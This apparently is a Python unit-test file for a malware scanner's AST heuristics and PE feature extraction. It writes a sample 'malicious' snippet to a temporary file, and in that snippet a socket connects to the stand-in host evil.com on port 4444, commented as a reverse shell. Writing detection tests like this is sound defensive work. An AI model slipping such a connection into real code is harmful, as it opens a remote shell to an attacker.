import os
import unittest
import tempfile

class TestMalwareFeatures(unittest.TestCase):
    def setUp(self):
        self.test_dir = os.path.dirname(os.path.abspath(__file__))
        self.app_dir = os.path.dirname(self.test_dir)
        
        # Create a malicious Python file for testing
        self.malicious_py = '''
import subprocess
import socket

def evil_function():
    # Execute system commands
    subprocess.call('echo "malicious"')
    # Create a reverse shell
    s = socket.socket()
    s.connect(('evil.com', 4444))
    '''
        
        # Create a benign Python file for testing
        self.benign_py = '''
def calculate_sum(a, b):
    return a + b

def greet(name):
    print(f"Hello {name}")
        '''
        
        # Save test files
        self.mal_file = os.path.join(tempfile.gettempdir(), 'malicious.py')
        self.benign_file = os.path.join(tempfile.gettempdir(), 'benign.py')
        with open(self.mal_file, 'w') as f:
            f.write(self.malicious_py)
        with open(self.benign_file, 'w') as f:
            f.write(self.benign_py)

    def test_heuristic_analysis(self):
        from app import analyze_python_ast
        
        # Test malicious file
        with open(self.mal_file) as f:
            mal_indicators = analyze_python_ast(f.read())
        self.assertTrue(len(mal_indicators) > 0)
        self.assertTrue(any('subprocess' in x for x in mal_indicators))
        self.assertTrue(any('socket' in x for x in mal_indicators))
        
        # Test benign file
        with open(self.benign_file) as f:
            benign_indicators = analyze_python_ast(f.read())
        self.assertEqual(len(benign_indicators), 0)

    def test_ml_features(self):
        """Mock the feature extraction to test the feature generation without requiring a real PE file"""
        import pandas as pd
        from feature_extraction import EXPECTED_COLUMNS
        
        # Create DataFrame with expected columns and data types
        mock_features = pd.DataFrame([{col: 0 for col in EXPECTED_COLUMNS}])
        mock_features['SectionMinEntropy'] = 5.2  # Set realistic entropy value
        mock_features['SectionMinVirtualsize'] = 4096  # Set realistic virtual size
        
        # Verify DataFrame shape and data types
        self.assertIsInstance(mock_features, pd.DataFrame)
        self.assertEqual(mock_features.shape[1], 23)  # Expected number of features
        
        # Check required features exist and have correct types
        self.assertEqual(mock_features['SectionMinEntropy'].dtype, float)
        self.assertEqual(mock_features['SectionMinVirtualsize'].dtype, int)
        
        # Check required features exist
        required_features = [
            'MajorLinkerVersion',
            'SectionMinEntropy',
            'SectionMinVirtualsize'
        ]
        for feature in required_features:
            self.assertIn(feature, mock_features.columns)
            
    def tearDown(self):
        # Clean up test files
        test_files = [self.mal_file, self.benign_file]
        if hasattr(self, 'test_pe'):
            test_files.append(self.test_pe)
        
        for f in test_files:
            try:
                if os.path.exists(f):
                    os.remove(f)
            except:
                pass

if __name__ == '__main__':
    unittest.main()